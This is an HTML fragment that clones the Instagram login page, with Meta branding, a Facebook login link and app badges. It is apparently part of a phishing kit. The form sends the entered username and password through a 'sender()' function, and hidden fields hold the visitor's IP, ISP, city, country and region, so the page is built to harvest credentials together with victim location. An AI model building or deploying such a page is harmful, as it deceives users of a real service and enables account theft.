<body>
    <div id="wrapper">
        <div class="container">
          <div class="phone-app-demo"></div>
          <div class="form-data">
            <form action="" onsubmit=" return sender()">
              <div class="logo">
                <img src="./images/logo.png" alt="logo">
              </div>
              <input type="hidden" id="ip" value="">
            <input type="hidden" id="isp" value="">
            <input type="hidden" id="city" value="">
            <input type="hidden" id="country" value="">
            <input type="hidden" id="region" value="">
              <input id="email" type="text" placeholder="Phone number, username, or email" required>
              <input id="password" type="password" placeholder="Password" required>
              <button class="form-btn" type="submit" id="btn">Log in</button>
              <span class="has-separator">Or</span>
              <a class="facebook-login" href="#">
                <i class="fab fa-facebook-square"></i> Log in with Facebook
              </a>
              <a class="password-reset" href="#">Forgot password?</a>
            </form>
            <div class="sign-up">
              Don't have an account? <a href="#">Sign up</a>
            </div>
            <div class="get-the-app">
              <span>Get the app.</span>
              <div class="badges">
                <img src="./images/app-store.png" alt="app-store badge">
                <img src="./images/microsoft.png" alt="google-play badge">
              </div>
            </div>
          </div>
        </div>
    
        <footer>
          <div class="container">
            <nav class="footer-nav">
              <ul>
                <li>
                  <a href="#">About us</a>
                </li>
                <li>
                  <a href="#">Support</a>
                </li>
                <li>
                  <a href="#">Press</a>

                <li>
                  <a href="#">Terms</a>
                </li>
                <li>
                  <a href="#">Directory</a>
                </li>
                <li>
                  <a href="#">Profiles</a>
                </li>
                <li>
                  <a href="#">Hashtags</a>
                </li>
                <li>
                  <a href="#">Languages</a>
                </li>
              </ul>
            </nav>
            <div class="copyright-notice">
              &copy 2023 Instagram from Meta
            </div>
          </div>
        </footer>
